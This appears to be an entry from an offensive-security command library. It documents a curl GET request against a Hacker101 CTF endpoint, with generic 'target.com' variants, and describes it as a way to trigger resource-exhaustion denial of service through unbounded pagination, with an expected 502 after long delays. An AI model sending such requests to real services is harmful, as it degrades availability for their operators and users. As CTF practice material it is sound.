---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X GET "https://ctf.hacker101.com/group" -H "User-Agent: Mozilla/5.0
  (Linux; Android 10; ONEPLUS A6000) AppleWebKit/537.36 (KHTML, like Gecko)
  Chrome/81.0.4044.117 Mobile Safari/537.36" -H "Accept-Encoding: gzip,
  gzip,deflate,br" -H "Cookie: [valid_session_cookie]" -H "Referer:
  https://ctf.hacker101.com/group" --max-time 60
tags:
  - dos
  - http
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:26:56.216Z'
verified: false
validated: true
submitted: true
---
# crafted-get-group-dos

## Command

```bash
curl -X GET "https://ctf.hacker101.com/group" \
  -H "User-Agent: Mozilla/5.0 (Linux; Android 10; ONEPLUS A6000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36" \
  -H "Accept-Encoding: gzip, gzip,deflate,br" \
  -H "Cookie: [valid_session_cookie]" \
  -H "Referer: https://ctf.hacker101.com/group" \
  --max-time 60
```

## Description

This curl command sends a crafted HTTP GET request to a paginated web endpoint to trigger resource exhaustion in inefficient implementations, causing delays and potential DoS. Use it when authenticated with an account having a large dataset to exploit full query loading in pagination.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `"https://ctf.hacker101.com/group"` | Target URL for the vulnerable endpoint | Yes |
| `-H "User-Agent: ..."` | Mimics a mobile browser to simulate client | Yes |
| `-H "Accept-Encoding: gzip, gzip,deflate,br"` | Includes duplicate gzip to potentially affect compression handling | Yes |
| `-H "Cookie: [valid_session_cookie]"` | Authenticates the request with session | Yes |
| `-H "Referer: ..."` | Self-referring to simulate navigation | Yes |
| `--max-time 60` | Sets timeout to 60 seconds to capture long delays | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.com/group" -H "Cookie: session=abc123" --max-time 60
```

### Advanced Usage

```bash
curl -X GET "https://target.com/group?page=1" \
  -H "User-Agent: custom UA" \
  -H "Accept-Encoding: gzip,deflate" \
  -H "Cookie: session=abc123" \
  -v  # Verbose for debugging
```

## Expected Output

The command will hang for 40-50 seconds before returning an HTTP/1.1 502 Bad Gateway response, often with a Cloudflare error page indicating a host error due to resource overload.

## Related

- [[Related Procedure|procedures/Trigger-Pagination-DoS-in-Web-Endpoint]]
